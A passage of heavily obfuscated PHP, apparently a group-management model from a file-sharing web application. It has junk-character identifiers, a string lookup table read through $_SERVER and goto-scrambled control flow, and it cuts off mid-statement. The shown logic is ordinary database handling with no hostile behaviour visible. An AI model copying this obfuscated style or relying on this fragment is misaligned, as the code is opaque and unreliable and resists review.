$bÅ¥ÜºèŸÎ[719], $bÅ¥ÜºèŸÎ[381] => $b™¯¸Ã–ª); } return Model($bÅ¥ÜºèŸÎ[1773])->addAll($a÷ìĞĞËÃÍ, array(), !0); goto Fîê¶š­¤¬; d¦Ñ·¯šğ: if ($b™¯¸Ã–ª == $bÅ¥ÜºèŸÎ[97]) { $bÓÇêè ‚Ÿ = $this->parentLevelArray($e©…ÌÒ¦Ÿó[$bÅ¥ÜºèŸÎ[496]]); } else { $F°Çñ¬‘Ù‚ = array($bÅ¥ÜºèŸÎ[562] => array($bÅ¥ÜºèŸÎ[521], $e©…ÌÒ¦Ÿó[$bÅ¥ÜºèŸÎ[496]] . $e©…ÌÒ¦Ÿó[$bÅ¥ÜºèŸÎ[1693]] . $bÅ¥ÜºèŸÎ[522])); $bÓÇêè ‚Ÿ = $this->where($F°Çñ¬‘Ù‚)->field($bÅ¥ÜºèŸÎ[1693])->select(); $bÓÇêè ‚Ÿ = array_to_keyvalue($bÓÇêè ‚Ÿ, $bÅ¥ÜºèŸÎ[33], $bÅ¥ÜºèŸÎ[1693]); } $bÓÇêè ‚Ÿ[] = $e©…ÌÒ¦Ÿó[$bÅ¥ÜºèŸÎ[1693]]; $a÷ìĞĞËÃÍ = array(); goto AÇù¯ùÒ·ˆ; Fîê¶š­¤¬: } protected function groupRemove($A„¤âÓÀ³) { goto B™ÅÅ•ï¥¿; C¿ØŞÆÊßÖ: if (!$Céò¾»Ö¹• || $Céò¾»Ö¹•[$d”‚Î•—°À[487]] == 0) { return !1; } $DÖ”²éÄîÑ = $this->getInfoSimple($Céò¾»Ö¹•[$d”‚Î•—°À[487]]); $this->_changeChildLevel($Céò¾»Ö¹•, $DÖ”²éÄîÑ, !0); goto bß…²êÃ¯À; bß…²êÃ¯À: $this->where(array($d”‚Î•—°À[487] => $A„¤âÓÀ³))->save(array($d”‚Î•—°À[487] => $Céò¾»Ö¹•[$d”‚Î•—°À[487]])); Model($d”‚Î•—°À[1773])->where($B¿®Ì×Ä—»)->delete(); Model($d”‚Î•—°À[1774])->where($B¿®Ì×Ä—»)->delete(); goto D¦öÄå³·; B™ÅÅ•ï¥¿: $d”‚Î•—°À =& $_SERVER[Ü˜]; $B¿®Ì×Ä—» = array($d”‚Î•—°À[1693] => $A„¤âÓÀ³); $Céò¾»Ö¹• = $this->where($B¿®Ì×Ä—»)->find(); goto C¿ØŞÆÊßÖ; D¦öÄå³·: Model($d”‚Î•—°À[799])->groupRootRemove($A„¤âÓÀ³); return $this->where($B¿®Ì×Ä—»)->delete(); goto A±ÒÈ¶Ø‹ù; A±ÒÈ¶Ø‹ù: } protected function groupSort($A´›–Ââã) { $f™ÄóÒŠ¦¸ =& $_SERVER[Ü˜]; $BáøÏ‘é”… = array(); foreach ($A´›–Ââã as $Eë†Úˆİ– => $cØ ‰”¢¯Ÿ) { $BáøÏ‘é”…[] = array($f™ÄóÒŠ¦¸[1693], $cØ ‰”¢¯Ÿ, $f™ÄóÒŠ¦¸[1716], $Eë†Úˆİ– + 1); } $this->saveAll($BáøÏ‘é”…); } public function listData() { $f×à·êŠéß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f×à·êŠéß[$_SERVER[Ü˜][376]]); return $f×à·êŠéß; } private function _makeOrder($câà»²£ÔÖ = '') { goto E‹İÙ‰­Ä£; Dã·³Î¨‚¼: $câà»²£ÔÖ = $câà»²£ÔÖ . "{$cà‘…¬ù¬ç}\x20{$DË°ŒÍÜ°ƒ}\54\x20\x67\x72\x6f\x75\160\111\104\x20\141\163\143"; return $this->order($câà»²£ÔÖ); goto aó´Î¶š‹Û; BÍÖ¾¥ğæ: $cà‘…¬ù¬ç = Input::get($c‚”á‡š·Ñ[444], $c‚”á‡š·Ñ[7], $c‚”á‡š·Ñ[1697], $E„İ°ÇÈÍ‘); $DË°ŒÍÜ°ƒ = Input::get($c‚”á‡š·Ñ[445], $c‚”á‡š·Ñ[7], $c‚”á‡š·Ñ[1775], array($c‚”á‡š·Ñ[1775], $c‚”á‡š·Ñ[439])); $DË°ŒÍÜ°ƒ = $FìÏ¶ØÎÕÎ[$DË°ŒÍÜ°ƒ]; goto Dã·³Î¨‚¼; E‹İÙ‰­Ä£: $c‚”á‡š·Ñ =& $_SERVER[Ü˜]; $E„İ°ÇÈÍ‘ = array($c‚”á‡š·Ñ[1693], $c‚”á‡š·Ñ[28], $c‚”á‡š·Ñ[1679], $c‚”á‡š·Ñ[204]); $FìÏ¶ØÎÕÎ = array($c‚”á‡š·Ñ[437] => $c‚”á‡š·Ñ[438], $c‚”á‡š·Ñ[439] => $c‚”á‡š·Ñ[440]); goto BÍÖ¾¥ğæ; aó´Î¶š‹Û: } public function listChild($BåÕ­š •) { $BÍ —»²å =& $_SERVER[Ü˜]; $C§º®Ã—ô = $this->where(array($BÍ —»²å[487] => $BåÕ­š •))->_makeOrder()->selectPage(200); $this->_listDataApply($C§º®Ã—ô[$BÍ —»²å[376]]); return $C§º®Ã—ô; } public function listByID($Dİ¹îÎ) { $D¬Ç•¶Ö™í =& $_SERVER[Ü˜]; if (!$Dİ¹îÎ) { return array(); } $cöƒÄ¦©ÏÃ = array($D¬Ç•¶Ö™í[1693] => array($D¬Ç•¶Ö™í[7], $Dİ¹îÎ)); $A—ˆÜºä–  = $this->where($cöƒÄ¦©ÏÃ)->select(); $this->_listDataApply($A—ˆÜºä– ); return $A—ˆÜºä– ; } public function listSearch($eË¯§Ş†ªÎ) { goto D·”ÒÈÎóµ; EØĞšŒ²‹œ: return $b’’‰±ˆÂ‘; goto c‰‹¤Ó¹Ş; A©‡œÏâñ»: if ($bä¯ª‹‚) { $cƒÄõ Áóå = $this->getInfoSimple($bä¯ª‹‚); $bÏ¹êÊÆÔ = $cƒÄõ Áóå[$C¸ãæŒÜå§[496]] . $bä¯ª‹‚ . $C¸ãæŒÜå§[522]; $c¶Ğˆêˆ¢Î = array($c¶Ğˆêˆ¢Î, array($C¸ãæŒÜå§[496] => array($C¸ãæŒÜå§[389], $bÏ¹êÊÆÔ))); } $c¶Ğˆêˆ¢Î = $this->parseWhereLike($c¶Ğˆêˆ¢Î); $b’’‰±ˆÂ‘ = $this->_makeOrder()->where($c¶Ğˆêˆ¢Î)->selectPage(20); goto F¯§Ëê®; e…³†£çåå: if (!trim($Eëã³«±ÌÆ)) { return !1; } $Eëã³«±ÌÆ = str_replace($C¸ãæŒÜå§[1778], $C¸ãæŒÜå§[1779], $Eëã³«±ÌÆ); $c¶Ğˆêˆ¢Î = array($C¸ãæŒÜå§[1693] => array($C¸ãæŒÜå§[389], "{$Eëã³«±ÌÆ}\45"), $C¸ãæŒÜå§[28] => array($C¸ãæŒÜå§[389], "\45{$Eëã³«±ÌÆ}\x25"), $C¸ãæŒÜå§[958] => $C¸ãæŒÜå§[1780]); goto A©‡œÏâñ»; D·”ÒÈÎóµ: $C¸ãæŒÜå§ =& $_SERVER[Ü˜]; $Eëã³«±ÌÆ = $eË¯§Ş†ªÎ[$C¸ãæŒÜå§[1776]]; $bä¯ª‹‚ = isset($eË¯§Ş†ªÎ[$C¸ãæŒÜå§[1777]]) ? $eË¯§Ş†ªÎ[$C¸ãæŒÜå§[1777]] : !1; goto e…³†£çåå; F¯§Ëê®: $b’’‰±ˆÂ‘ = $b’’‰±ˆÂ‘ ? $b’’‰±ˆÂ‘ : array($C¸ãæŒÜå§[376] => array(), $C¸ãæŒÜå§[373] => array()); if (!$b’’‰±ˆÂ‘ || count($b’’‰±ˆÂ‘[$C¸ãæŒÜå§[376]]) < 5 && Input::check($Eëã³«±ÌÆ, $C¸ãæŒÜå§[325])) { goto FŠÑ­ö‰¤; Fì›í•ÊÊ²: $b’’‰±ˆÂ‘[$C¸ãæŒÜå§[373]][$C¸ãæŒÜå§[375]] = ceil($b’’‰±ˆÂ‘[$C¸ãæŒÜå§[373]][$C¸ãæŒÜå§[374]] / $b’’‰±ˆÂ‘[$C¸ãæŒÜå§[373]][$C¸ãæŒÜå§[370]]); goto E‰•‹›‘¼ë; FŠÑ­ö‰¤: $F‡í¬‡é = $this->groupChildrenAll($bä¯ª‹‚); $f™Œ½•·ô” = $this->_searchFromMeta($C¸ãæŒÜå§[452], $Eëã³«±ÌÆ, 10, $F‡í¬‡é); $BÑ™Å¬É¿„ = $this->_searchFromMeta($C¸ãæŒÜå§[453], $Eëã³«±ÌÆ, 10, $F‡í¬‡é); goto F©ö£Ü¹”; F©ö£Ü¹”: $cÂ»–¤¼á¦ = array_merge($f™Œ½•·ô”, $BÑ™Å¬É¿„, $b’’‰±ˆÂ‘[$C¸ãæŒÜå§[376]]); $b’’‰±ˆÂ‘[$C¸ãæŒÜå§[376]] = array_unique_by_key($cÂ»–¤¼á¦, $C¸ãæŒÜå§[1693]); $b’’‰±ˆÂ‘[$C¸ãæŒÜå§[373]][$C¸ãæŒÜå§[374]] = count($b’’‰±ˆÂ‘[$C¸ãæŒÜå§[376]]); goto Fì›í•ÊÊ²; E‰•‹›‘¼ë: } $this->_listDataApply($b’’‰±ˆÂ‘[$C¸ãæŒÜå§[376]]); goto EØĞšŒ²‹œ; c‰‹¤Ó¹Ş: } protected function groupChildrenAll($EØ¥‚âæµ) { $C•‡âµ§À¤ =& $_SERVER[Ü˜]; if (!$EØ¥‚âæµ) { return !1; } if (is_string($EØ¥‚âæµ)) { $EØ¥‚âæµ = array($EØ¥‚âæµ); } $bÚñ¯—†õ¨ = $EØ¥‚âæµ; foreach ($EØ¥‚âæµ as $cÆ±×Ê ³‘) { $cí³Ç÷˜ù = $this->getInfoSimple($cÆ±×Ê ³‘); $cé³Ä­øš = array($C•‡âµ§À¤[496] => array($C•‡âµ§À¤[389], $cí³Ç÷˜ù[$C•‡âµ§À¤[496]] . $cÆ±×Ê ³‘ . $C•‡âµ§À¤[522])); $DÏ×ˆ‰Ú¼ = $this->field($C•‡âµ§À¤[1693])->where($cé³Ä­øš)->select(); $bÚñ¯—†õ¨ = array_merge($bÚñ¯—†õ¨, array_to_keyvalue($DÏ×ˆ‰Ú¼, $C•‡âµ§À¤[33], $C•‡âµ§À¤[1693])); } return array_unique($bÚñ¯—†õ¨); } private function _searchFromMeta($DÃ¡ñà°—, $Aö‚÷™Ï‚£, $Fï„¤¬§—„, $d˜ç‰Éç„) { goto cÙ‰Úôò; cÙ‰Úôò: $e¥Ò­£î =& $_SERVER[Ü˜]; $Aö‚÷™Ï‚£ = strtolower($Aö‚÷™Ï‚£); $Eğƒ¿Æ…²Š = array($e¥Ò­£î[103] => $DÃ¡ñà°—, $e¥Ò­£î[381] => array($e¥Ò­£î[389], "\45{$Aö‚÷™Ï‚£}\45")); goto F™è³Í½¦ß; déŸ÷–·Œ: if (!$f…„ğ‰•äø) { return array(); } return $f…„ğ‰•äø; goto bóªŠ¨Ö§; F™è³Í½¦ß: $Eğƒ¿Æ…²Š = $this->parseWhereLike($Eğƒ¿Æ…²Š); if ($d˜ç‰Éç„) { $Eğƒ¿Æ…²Š[$e¥Ò­£î[1693]] = array($e¥Ò­£î[7], $d˜ç‰Éç„); } $cÜëå¸ ±Œ = Model($e¥Ò­£î[1781])->where($Eğƒ¿Æ…²Š)->limit($Fï„¤¬§—„)->select(); goto fİ¸ªÅ¹ñµ; fİ¸ªÅ¹ñµ: if (!$cÜëå¸ ±Œ) { return array(); } $cÜëå¸ ±Œ = array_to_keyvalue($cÜëå¸ ±Œ, $e¥Ò­£î[33], $e¥Ò­£î[1693]); $f…„ğ‰•äø = $this->where(array($e¥Ò­£î[1771] => array($e¥Ò­£î[7], $cÜëå¸ ±Œ)))->select(); goto déŸ÷–·Œ; bóªŠ¨Ö§: } protected function _listDataApplyItem($d¼±àíĞ’ˆ) { $DË…Ä…«â = array($d¼±àíĞ’ˆ); $this->_listDataApply($DË…Ä…«â); return $DË…Ä…«â[0]; } protected function _listDataApply(&$B‹¯¿ãì£) { goto aÔÊÎÄí‘ñ; cíäîËå†­: $this->_listAppendChildren($B‹¯¿ãì£); $this->_listAppendChildrenMember($B‹¯¿ãì£); $this->_listAppendMeta($B‹¯¿ãì£, $f®‚ÌÀÜ÷); goto b³ÏÉõÊ; b³ÏÉõÊ: $this->_listAppendParent($B‹¯¿ãì£); $this->_listAppendSourceRoot($B‹¯¿ãì£, $f®‚ÌÀÜ÷); goto DŒïˆÔ Œ; aÔÊÎÄí‘ñ: $AàÔ¸¢Âô„ =& $_SERVER[Ü˜]; if (!$B‹¯¿ãì£) { return; } $f®‚ÌÀÜ÷ = array_to_keyvalue($B‹¯¿ãì£, $AàÔ¸¢Âô„[33], $AàÔ¸¢Âô„[1693]); goto cíäîËå†­; DŒïˆÔ Œ: } private function _listAppendChildren(&$c‡’›š¹Šî) { goto e‚Ñ‡ÅíÆ; C¤–º½ÊŸ: $B¢¹¤•¤ † = array($DõÏõ‹ó‹[487], $DõÏõ‹ó‹[1782] => $DõÏõ‹ó‹[489]); $AĞíÌ—ÉĞ˜ = $this->field($B¢¹¤•¤ †)->where($dÛ ×îÌö¤)->group($DõÏõ‹ó‹[487])->select(); $B§ğë¯ôš = array_to_keyvalue($AĞíÌ—ÉĞ˜, $DõÏõ‹ó‹[487], $DõÏõ‹ó‹[489]); goto A‹áÆ³ç›ğ; e‚Ñ‡ÅíÆ: $DõÏõ‹ó‹ =& $_SERVER[Ü˜]; $c¡ÖâÉ–ö„ = array_to_keyvalue($c‡’›š¹Šî, $DõÏõ‹ó‹[33], $DõÏõ‹ó‹[1693]); $dÛ ×îÌö¤ = array($DõÏõ‹ó‹[487] => array($DõÏõ‹ó‹[7], $c¡ÖâÉ–ö„)); goto C¤–º½ÊŸ; A‹áÆ³ç›ğ: foreach ($c‡’›š¹Šî as &$C£µ¼¯¼áÇ) { $bßÖƒÕÚ… = $C£µ¼¯¼áÇ[$DõÏõ‹ó‹[1693]]; $C£µ¼¯¼áÇ[$DõÏõ‹ó‹[1783]] = isset($B§ğë¯ôš[$bßÖƒÕÚ…]) ? intval($B§ğë¯ôš[$bßÖƒÕÚ…]) : !1; } unset($C£µ¼¯¼áÇ); goto DŠ“ÔˆÆ¾; DŠ“ÔˆÆ¾: } private function _listAppendChildrenMember(&$DÎÚµ¾«Ç±) { goto a†É‚Ğ‚ÖÑ; a†É‚Ğ‚ÖÑ: $a‰Ë¦³÷¦‚ =& $_SERVER[Ü˜]; $a¶ÄÈÍ²¬Å = array_to_keyvalue($DÎÚµ¾«Ç±, $a‰Ë¦³÷¦‚[33], $a‰Ë¦³÷¦‚[1693]); $b¦Â¬Öå = array($a‰Ë¦³÷¦‚[1693] => array($a‰Ë¦³÷¦‚[7], $a¶ÄÈÍ²¬Å)); goto BµåÃñğØ; BµåÃñğØ: $a¾‚ŒËò¥½ = array($a‰Ë¦³÷¦‚[1693], $a‰Ë¦³÷¦‚[1782] => $a‰Ë¦³÷¦‚[489]); $BÎñ³°ªĞñ = Model($a‰Ë¦³÷¦‚[1774])->field($a¾‚ŒËò¥½)->where($b¦Â¬Öå)->group($a‰Ë¦³÷¦‚[1693])->select(); $DÍ¾éòŒëí = array_to_keyvalue($BÎñ³°ªĞñ, $a‰Ë¦³÷¦‚[1693], $a‰Ë¦³÷¦‚[489]); goto CÚ¦ïßâ˜ ; CÚ¦ïßâ˜ : foreach ($DÎÚµ¾«Ç± as &$BÜ²¹È»Æß) { $aÂ£ŠÇ¾³ğ = $BÜ²¹È»Æß[$a‰Ë¦³÷¦‚[1693]]; $BÜ²¹È»Æß[$a‰Ë¦³÷¦‚[1784]] = isset($DÍ¾éòŒëí[$aÂ£ŠÇ¾³ğ]) ? intval($DÍ¾éòŒëí[$aÂ£ŠÇ¾³ğ]) : !1; } unset($BÜ²¹È»Æß); goto f‰ó÷ÓÄ÷‰; f‰ó÷ÓÄ÷‰: } private function _listAppendMeta(&$C¤çŸöØšà, $dêëÆÇêƒÔ) { goto cçåÙ”–Ö; Dƒµ¬âˆÒí: foreach ($C¤çŸöØšà as &$Fä”ç «‹×) { $Fä”ç «‹×[$A¿ŠÔÉëãÚ[454]] = array(); if (isset($b°ÇõïªÖ[$Fä”ç «‹×[$A¿ŠÔÉëãÚ[1693]]])) { $Fä”ç «‹×[$A¿ŠÔÉëãÚ[454]] = $b°ÇõïªÖ[$Fä”ç «‹×[$A¿ŠÔÉëãÚ[1693]]]; } } unset($Fä”ç «‹×); goto c¨¯¶Ó²Ø; cçåÙ”–Ö: $A¿ŠÔÉëãÚ =& $_SERVER[Ü˜]; $AáÕ½³ò¸Ü = array($A¿ŠÔÉëãÚ[1693] => array($A¿ŠÔÉëãÚ[7], $dêëÆÇêƒÔ)); $b°ÇõïªÖ = Model($A¿ŠÔÉëãÚ[1773])->where($AáÕ½³ò¸Ü)->select(); goto añå¢ˆâ½¤; añå¢ˆâ½¤: $b°ÇõïªÖ = array_to_keyvalue_group($b°ÇõïªÖ, $A¿ŠÔÉëãÚ[1693]); foreach ($b°ÇõïªÖ as &$B‰÷ŞËòæ) { $B‰÷ŞËòæ = array_to_keyvalue($B‰÷ŞËòæ, $A¿ŠÔÉëãÚ[103], $A¿ŠÔÉëãÚ[381]); } unset($B‰÷ŞËòæ); goto Dƒµ¬âˆÒí; c¨¯¶Ó²Ø: } protected function parentLevelArray($b“¦‰¯ª¼) { $eÀø–Ôù¦ =& $_SERVER[Ü˜]; $b“¦‰¯ª¼ = explode($eÀø–Ôù¦[47], trim($b“¦‰¯ª¼, $eÀø–Ôù¦[47])); $b“¦‰¯ª¼ = array_remove_value($b“¦‰¯ª¼, $eÀø–Ôù¦[201]); return $b“¦‰¯ª¼; } private function _listAppendParent(&$CÕ‹É®áä§) { goto fßÊ‰Ş; fßÊ‰Ş: $DßÈ“Ïª¨† =& $_SERVER[Ü˜]; $DÂ–Òåîç¦ = array(); foreach ($CÕ‹É®áä§ as &$cÛ¢³¹„‡İ) { $DÂ–Òåîç¦[$cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[1693]]] = $cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[28]]; $cõªŠÓ´£ = $this->parentLevelArray($cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[496]]); foreach ($cõªŠÓ´£ as $fğ”–ÍŸ½Ş) { if (!isset($DÂ–Òåîç¦[$fğ”–ÍŸ½Ş])) { $DÂ–Òåîç¦[$fğ”–ÍŸ½Ş] = 0; } } } goto A¢ŞßÃï†²; A¢ŞßÃï†²: unset($cÛ¢³¹„‡İ); foreach ($DÂ–Òåîç¦ as $CâÎÎ¯·…À => $cÈÍÊÕïÅ…) { if ($cÈÍÊÕïÅ…) { continue; } $Aæ´¨±ô = $this->getInfoSimple($CâÎÎ¯·…À); $DÂ–Òåîç¦[$CâÎÎ¯·…À] = $Aæ´¨±ô[$DßÈ“Ïª¨†[28]]; } $B‡¶ÕĞÁ‰† = $GLOBALS[$DßÈ“Ïª¨†[6]][$DßÈ“Ïª¨†[98]][$DßÈ“Ïª¨†[1785]]; goto fùÕÎë‰Îé; fùÕÎë‰Îé: if ($GLOBALS[$DßÈ“Ïª¨†[494]] == $DßÈ“Ïª¨†[97]) { $B‡¶ÕĞÁ‰† = !1; } foreach ($CÕ‹É®áä§ as &$cÛ¢³¹„‡İ) { $cõªŠÓ´£ = $this->parentLevelArray($cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[496]]); $Dø“±Âî¯¦ = $DßÈ“Ïª¨†[33]; foreach ($cõªŠÓ´£ as $CâÎÎ¯·…À => $fğ”–ÍŸ½Ş) { if ($B‡¶ÕĞÁ‰† && $CâÎÎ¯·…À == 0) { continue; } $Dø“±Âî¯¦ .= $DÂ–Òåîç¦[$fğ”–ÍŸ½Ş] . $DßÈ“Ïª¨†[8]; } if ($cõªŠÓ´£) { $Dø“±Âî¯¦ .= $cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[28]]; } $cÛ¢³¹„‡İ[$DßÈ“Ïª¨†[500]] = str_replace($DßÈ“Ïª¨†[505], $DßÈ“Ïª¨†[8], $Dø“±Âî¯¦); } unset($cÛ¢³¹„‡İ); goto b¤ì°¼¹á; b¤ì°¼¹á: } private function _listAppendSourceRoot(&$B†—¸­–, $Fí³×ò°) { goto bÉ×¢çÅò; a÷ğ¿ÚÏË: $bÅæêŒ‹Ã¾ = Model($aİ‚óçåÍ¶[799])->order($aİ‚óçåÍ¶[1787])->field($FŒ˜Èº±õÆ)->where($a”‡Æî¨)->select(); $bÅæêŒ‹Ã¾ = array_to_keyvalue($bÅæêŒ‹Ã¾, $aİ‚óçåÍ¶[493]); $bÅæêŒ‹Ã¾ = array_remove_key($bÅæêŒ‹Ã¾, $aİ‚óçåÍ¶[493]); goto DŞŞ†ÊšÑÓ; bÉ×¢çÅò: $aİ‚óçåÍ¶ =& $_SERVER[Ü˜]; $a”‡Æî¨ = array($aİ‚óçåÍ¶[413] => SourceModel::TYPE_GROUP, $aİ‚óçåÍ¶[487] => 0, $aİ‚óçåÍ¶[493] => array($aİ‚óçåÍ¶[7], $Fí³×ò°)); $FŒ˜Èº±õÆ = $aİ‚óçåÍ¶[1786]; goto a÷ğ¿ÚÏË; DŞŞ†ÊšÑÓ: foreach ($B†—¸­– as &$C²ï ¬˜ùŠ) { $C²ï ¬˜ùŠ[$aİ‚óçåÍ¶[95]] = $bÅæêŒ‹Ã¾[$C²ï ¬˜ùŠ[$aİ‚óçåÍ¶[1693]]] ? $bÅæêŒ‹Ã¾[$C²ï ¬˜ùŠ[$aİ‚óçåÍ¶[1693]]] : array(); } unset($C²ï ¬˜ùŠ); goto f†Åò…¢·¦; f†Åò…¢·¦: } protected function groupMerge($A¿ÇŠîùïØ) { $A¿ÇŠîùïØ = array_values(array_unique($A¿ÇŠîùïØ)); $Dë«ç¸µîå = array(); for ($CÃôŒïçÉÆ = 0; $CÃôŒïçÉÆ < count($A¿ÇŠîùïØ); $CÃôŒïçÉÆ++) { $AÁ¥ºÎˆÏ = !1; for ($e¬ÌĞ…©»‹ = 0; $e¬ÌĞ…©»‹ < count($A¿ÇŠîùïØ); $e¬ÌĞ…©»‹++) { if ($CÃôŒïçÉÆ == $e¬ÌĞ…©»‹) { continue; } if ($this->isParentOf($A¿ÇŠîùïØ[$e¬ÌĞ…©»‹], $A¿ÇŠîùïØ[$CÃôŒïçÉÆ])) { $AÁ¥ºÎˆÏ = !0; break; } } if (!$AÁ¥ºÎˆÏ) { $Dë«ç¸µîå[] = $A¿ÇŠîùïØ[$CÃôŒïçÉÆ]; } } return $Dë«ç¸µîå; } protected function isParentOf($A¯Ö¢°º°™, $AÔà·ƒ¨ê) { goto dî¬¶öºè£; E™é„ÔÈà: $déÓŒâÆì = $this->getInfoSimple($AÔà·ƒ¨ê); $Cğ„Ö© ˆØ = $EÛÇÎñãëÅ[$Cº‚¬ÙÁ„ğ[496]] . $A¯Ö¢°º°™ . $Cº‚¬ÙÁ„ğ[47]; if (substr($déÓŒâÆì[$Cº‚¬ÙÁ„ğ[496]], 0, strlen($Cğ„Ö© ˆØ)) == $Cğ„Ö© ˆØ) { return !0; } goto eßŠœ—¨ì×; dî¬¶öºè£: $Cº‚¬ÙÁ„ğ =& $_SERVER[Ü˜]; if (!$A¯Ö¢°º°™ || !$AÔà·ƒ¨ê || $A¯Ö¢°º°™ == $AÔà·ƒ¨ê) { return !1; } $EÛÇÎñãëÅ = $this->getInfoSimple($A¯Ö¢°º°™); goto E™é„ÔÈà; eßŠœ—¨ì×: return !1; goto FÇš¤êÄÕğ; FÇš¤êÄÕğ: } public function groupShowRoot($bŒºçëßóà, $bÆÑâàäâ = false) { goto aÛ¹øÕ­›; døù‹‰æ¨: if ($bÆÑâàäâ && count($DÁãÊÆ´ ñ) == 1) { return $F®»ÀêÏõ²; } if (!$cÙËá„¸í[$A¨‡ƒ£Èº[454]] || !isset($cÙËá„¸í[$A¨‡ƒ£Èº[454]][$A¨‡ƒ£Èº[1769]]) || $cÙËá„¸í[$A¨‡ƒ£Èº[454]][$A¨‡ƒ£Èº[1769]] == $A¨‡ƒ£Èº[1743]) { return $this->groupShowRoot($DÁãÊÆ´ ñ[count($DÁãÊÆ´ ñ) - 1], $bÆÑâàäâ); } if ($cÙËá„¸í[$A¨‡ƒ£Èº[454]][$A¨‡ƒ£Èº[1769]] == $A¨‡ƒ£Èº[366]) { $e· ËÜ‰ = explode($A¨‡ƒ£Èº[47], $cÙËá„¸í[$A¨‡ƒ£Èº[454]][$A¨‡ƒ£Èº[1770]]); if ($e· ËÜ‰) { $F®»ÀêÏõ² = array_merge($F®»ÀêÏõ², $e· ËÜ‰); } } goto E³‰ŠèŞ×ğ; E³‰ŠèŞ×ğ: return $F®»ÀêÏõ²; goto BË‚ŒÀİèğ; aÛ¹øÕ­›: $A¨‡ƒ£Èº =& $_SERVER[Ü˜]; $cÙËá„¸í = $this->getInfo($bŒºçëßóà); if (!$cÙËá„¸í) { return array(); } goto A²ÌÅ¤ÈŞ•; A²ÌÅ¤ÈŞ•: $DÁãÊÆ´ ñ = $this->parentLevelArray($cÙËá„¸í[$A¨‡ƒ£Èº[496]]); $F®»ÀêÏõ² = array($bŒºçëßóà); if (count($DÁãÊÆ´ ñ) == 0) { return $F®»ÀêÏõ²; } goto døù‹‰æ¨; BË‚ŒÀİèğ: } protected function resetParentLevel() { $bğ ãÁâå½ =& $_SERVER[Ü˜]; $bõ·Ñ‹Œçï = $bğ ãÁâå½[1693]; $c³Œµó…‚ = $this->select(); $c³Œµó…‚ = array_to_keyvalue($c³Œµó…‚, $bõ·Ñ‹Œçï); foreach ($c³Œµó…‚ as $EÈªº¬®Û) { goto EôÎëÀ›¹±; EôÎëÀ›¹±: $Dªá¤ĞÆµØ = $EÈªº¬®Û; $AÚ‰Ÿ¯‚¸Ù = array(); while ($Dªá¤ĞÆµØ[$bğ ãÁâå½[487]] != 0) { $AÚ‰Ÿ¯‚¸Ù[] = $Dªá¤ĞÆµØ[$bğ ãÁâå½[487]]; $Dªá¤ĞÆµØ = $c³Œµó…‚[$Dªá¤ĞÆµØ[$bğ ãÁâå½[487]]]; } goto b¹…àç‹××; b¹…àç‹××: $AÚ‰Ÿ¯‚¸Ù[] = 0; $AÚ‰Ÿ¯‚¸Ù = $bğ ãÁâå½[47] . implode($bğ ãÁâå½[47], array_reverse($AÚ‰Ÿ¯‚¸Ù)) . $bğ ãÁâå½[47]; $this->setNamePinyin($EÈªº¬®Û[$bõ·Ñ‹Œçï], $EÈªº¬®Û[$bğ ãÁâå½[28]]); goto Fô™¸ÛÕî—; Fô™¸ÛÕî—: $this->where(array($bõ·Ñ‹Œçï => $EÈªº¬®Û[$bõ·Ñ‹Œçï]))->save(array($bğ ãÁâå½[562] => $AÚ‰Ÿ¯‚¸Ù)); goto b­ˆ¤±Ä÷ô; b­ˆ¤±Ä÷ô: } return $c³Œµó…‚; } public function groupNameAuto($B³¼©Ñ¼Ë, $fò­œ©ì‘) { $A‰Ï–â–Ÿƒ =& $_SERVER[Ü˜]; $a„¦ÎÎ“ë = $this->where(array($A‰Ï–â–Ÿƒ[403] => $B³¼©Ñ¼Ë))->getField($A‰Ï–â–Ÿƒ[28], !0); if (!$a„¦ÎÎ“ë || !in_array($fò­œ©ì‘, $a„¦ÎÎ“ë)) { return $fò­œ©ì‘; } for ($cŠÅÇÈ‚³ = 1; $cŠÅÇÈ‚³ <= count($a„¦ÎÎ“ë) + 1; $cŠÅÇÈ‚³++) { $Bµ´Ü„çÔÀ = $fò­œ©ì‘ . "\50{$cŠÅÇÈ‚³}\x29"; if (!in_array($Bµ´Ü„çÔÀ, $a„¦ÎÎ“ë)) { return $Bµ´Ü„çÔÀ; } } } public function groupSwitch($BÃ¹¿Ã‡Ö, $CÍ÷Ì˜ŸÎö) { goto Cäêµ¶½¾×; fñ™É¤ÉÖ­: $this->where(array($Bï²®ÅÃâÇ[487] => $BÃ¹¿Ã‡Ö))->save(array($Bï²®ÅÃâÇ[487] => $CÍ÷Ì˜ŸÎö)); return !0; goto Eù¸‚¢ÚŒ; D³„‘›²„ğ: $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[413] => 2, $Bï²®ÅÃâÇ[487] => 0, $Bï²®ÅÃâÇ[412] => 1, $Bï²®ÅÃâÇ[493] => array($Bï²®ÅÃâÇ[7], array($BÃ¹¿Ã‡Ö, $CÍ÷Ì˜ŸÎö))); $C‡‰æ¢ÆÈ© = Model($Bï²®ÅÃâÇ[799])->where($e›òÈ§ïóÕ)->field($Bï²®ÅÃâÇ[1789])->select(); $C‡‰æ¢ÆÈ© = array_to_keyvalue($C‡‰æ¢ÆÈ©, $Bï²®ÅÃâÇ[493], $Bï²®ÅÃâÇ[404]); goto A™Ôê¢Íˆ‹; D¢ñÕíÓ¡Ö: $b¼ö“¶‡µ¶ = array_to_keyvalue($b¼ö“¶‡µ¶, $Bï²®ÅÃâÇ[1693]); if (!isset($b¼ö“¶‡µ¶[$BÃ¹¿Ã‡Ö]) || !isset($b¼ö“¶‡µ¶[$CÍ÷Ì˜ŸÎö]) || $b¼ö“¶‡µ¶[$BÃ¹¿Ã‡Ö][$Bï²®ÅÃâÇ[487]] == 0) { return !1; } $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[1693] => $BÃ¹¿Ã‡Ö); goto e´ç‰šÖÏ—; Cäêµ¶½¾×: $Bï²®ÅÃâÇ =& $_SERVER[Ü˜]; $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[1693] => array($Bï²®ÅÃâÇ[7], array($BÃ¹¿Ã‡Ö, $CÍ÷Ì˜ŸÎö))); $b¼ö“¶‡µ¶ = $this->where($e›òÈ§ïóÕ)->select(); goto D¢ñÕíÓ¡Ö; A™Ôê¢Íˆ‹: $d„”Ğ÷î¶» = 